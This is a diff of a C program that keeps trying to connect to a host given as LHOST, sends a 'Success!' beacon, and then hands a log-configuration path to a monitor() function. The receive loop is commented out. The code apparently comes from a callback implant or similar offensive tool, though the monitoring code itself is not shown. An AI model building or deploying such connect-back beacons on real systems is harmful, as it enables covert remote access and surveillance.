@@ -9,7 +9,14 @@
 #include <errno.h>
 #include <arpa/inet.h>
 
+#include "monitor.h"
+
 int main(int argc, char* argv[]) {
+    if (argc == 1) {
+        printf("Invalid usage - please provide the path to the logging location configuration files\n");
+        return -1;
+    }
+
     char beacon[] = "Success!";
     char HOST[] = LHOST;
     int sockfd = 0, n = 0;
@@ -31,17 +38,19 @@ int main(int argc, char* argv[]) {
     while (connect(sockfd, (struct sockaddr *)&serv_addr, sizeof(serv_addr)) < 0) {
         sleep(1);
     }
+    send(sockfd, beacon, strlen(beacon), 0);
     printf("Done!\n[+] Connected to server!\n");
 
-    send(sockfd, beacon, strlen(beacon), 0);
+    printf("[+] Setting up log monitoring...\n");
+    monitor(argv[1]);
 
-    while ((n = read(sockfd, recvBuff, sizeof(recvBuff)-1)) > 0) {
-        recvBuff[n] = 0;
-        if(fputs(recvBuff, stdout) == EOF) {
-            printf("\n Error : Fputs error");
-        }
-        printf("\n");
-    }
+    // while ((n = read(sockfd, recvBuff, sizeof(recvBuff)-1)) > 0) {
+    //     recvBuff[n] = 0;
+    //     if(fputs(recvBuff, stdout) == EOF) {
+    //         printf("\n Error : Fputs error");
+    //     }
+    //     printf("\n");
+    // }
 
     if (n < 0) {
         printf("\n Error reading from socket! Was the connection closed? \n");
